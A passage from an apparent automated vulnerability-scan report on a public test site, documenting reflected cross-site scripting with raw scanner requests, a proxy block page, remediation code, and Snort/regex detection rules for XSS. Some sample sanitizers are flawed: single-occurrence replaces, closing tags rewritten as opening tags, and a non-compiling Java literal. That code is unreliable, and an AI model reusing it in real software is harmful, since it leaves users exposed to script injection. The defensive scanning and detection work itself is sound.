</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="99E4C81ACF9EE613E0B1284B6884E404"><![CDATA[GET /pictures/5.jpg.tn/%33%35%38%34%38 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="99E4C81ACF9EE613E0B1284B6884E404";PSID="B0FAAD259EA0EB4318492E36606967F8";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2535%2538%2534%2538";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="50e034ed";
X-Request-Memo: ID="40beb8da";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/5.jpg.tn/35848");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:50</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="99E4C81ACF9EE613E0B1284B6884E404"><Method>GET</Method><Path>/pictures/5.jpg.tn/</Path><File>%33%35%38%34%38</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="99E4C81ACF9EE613E0B1284B6884E404";PSID="B0FAAD259EA0EB4318492E36606967F8";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2535%2538%2534%2538";AttackStringProps="Attack";tid="47";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="50e034ed";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="40beb8da";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/5.jpg.tn/35848");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:50</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="E2CC57F2AF8AF23E6F4F62DCAA389E69"><URL>http://php.vulnweb.com:80/pictures/8.jpg.tn/%32%38%32%37%33</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="00581ef7-d4a9-4763-af91-799bb4a615b3"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/8.jpg.tn/%32%38%32%37%33 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="E2CC57F2AF8AF23E6F4F62DCAA389E69";PSID="7836BF31381A834F702ACDA8226CFA98";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2532%2538%2532%2537%2533";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="fdc03c92";
X-Request-Memo: ID="27c30433";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
